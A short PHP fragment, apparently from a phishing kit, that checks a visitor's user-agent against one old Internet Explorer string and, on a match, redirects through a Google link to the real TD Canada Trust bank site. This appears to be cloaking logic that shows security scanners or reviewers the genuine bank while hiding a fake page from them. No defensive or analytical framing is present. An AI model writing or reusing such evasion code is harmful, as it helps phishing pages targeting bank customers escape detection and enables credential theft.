<?php
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
header("Location: https://www.google.co.jp/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiTgsCQ3tjJAhWIjZQKHQXsAXgQFggcMAA&url=https%3A%2F%2Fwww.tdcanadatrust.com%2F&usg=AFQjCNEhks6EUDP86GbvispdToiDFeTG0g");
die();
}
?>